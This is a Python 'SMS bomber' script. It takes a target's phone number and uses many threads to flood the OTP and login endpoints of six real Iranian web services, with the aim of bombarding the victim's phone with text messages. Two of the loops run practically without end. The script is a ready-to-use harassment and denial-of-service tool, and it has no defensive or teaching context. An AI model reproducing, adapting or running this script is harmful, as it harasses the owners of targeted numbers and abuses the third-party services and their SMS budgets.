import os , threading
try:
	import requests
except:
	print("instaling requests ...")
	os.system("python -m pip install requests")
	import requests
	

try:
	import colorama
except:
	print("instaling colorama ...")
	os.system("python -m pip install colorama")
	import colorama
	
red = colorama.Fore.RED
green = colorama.Fore.GREEN
bgreen = colorama.Back.GREEN
bred = colorama.Back.RED
black = colorama.Fore.BLACK

print("""

┌─┐┌┬┐┌─┐  ┌┐ ┌─┐┌┬┐┌┐ ┌─┐┬─┐
└─┐│││└─┐  ├┴┐│ ││││├┴┐├┤ ├┬┘
└─┘┴ ┴└─┘  └─┘└─┘┴ ┴└─┘└─┘┴└─


""")
print("Email : \n DrScripter32@gmail.com")
print("Github : \n Gitub.com/Drscripter32")

try:
	r = requests.get("http://api.myip.com")
	print("your IP : ")
	print(green , r.text)
except:
	print("Error ... !")
	exit()
print(bred)
print(" example : 9041234567")
number = input(" number   : ")
num = ("0"+ number)
def one():
	 for x in range(0,999999999999999999):
 		json ={"phoneNumber":num,"hostName":"ati.land"}
 		rr = requests.post("https://api.profile.center/api/app/account/login" , json = json)
 		print(red,"API 1 : ",bred , green ,"Code : ",bgreen , black,rr.status_code)
	
def two():
	for y in range(0,9999999999999999999):
 		j = {"mobile" : num}
 		re = requests.post("https://api.timcheh.com/auth/otp/send" , json = j )
 		print(red,"API 2 : "  , bred,green, "Code : " ,bgreen, black, r.status_code)
def tap30():
	for _ in range(0,8):
		r1 = requests.post("https://tap33.me/api/v2/user" , json = {"credential":{"phoneNumber":num,"role":"PASSENGER"}})
		print(red,"API 3 : "  , bred ,green, "Code : " ,bgreen, black, r1.status_code)
def alibaba():
	for _ in range(0,9):
		r2 = requests.post("https://ws.alibaba.ir/api/v3/account/mobile/otp" , json= {"phoneNumber": num})
		print(red,"API 4 : "  , bred ,green, "Code : " ,bgreen, black, r2.status_code)
	
def filmnet():
	urr = ("https://api-v2.filmnet.ir/access-token/users/"+ num +"/otp")
	for _ in range(0,5):
		r3 = requests.get(urr)
		print(red,"API 5 : "  , bred ,green, "Code : " ,bgreen, black, r3.status_code)
		
def torop():
	urr = ("https://api.torob.com/a/phone/send-pin/?phone_number="+ num)
	for _ in range(0,5):
		r4 = requests.get(urr)
		print(red,"API 6 : "  , bred ,green, "Code : " ,bgreen, black, r4.status_code)

threading.Thread(target=tap30).start()
threading.Thread(target=alibaba).start()
threading.Thread(target=filmnet).start()
threading.Thread(target=torop).start()
for _ in range(5):
    try:
	    thread = threading.Thread(target=one) 
	    thread.start()
	    thread = threading.Thread(target=two) 
	    thread.start()
	    
    except:
    	print("failed to make thread :(")
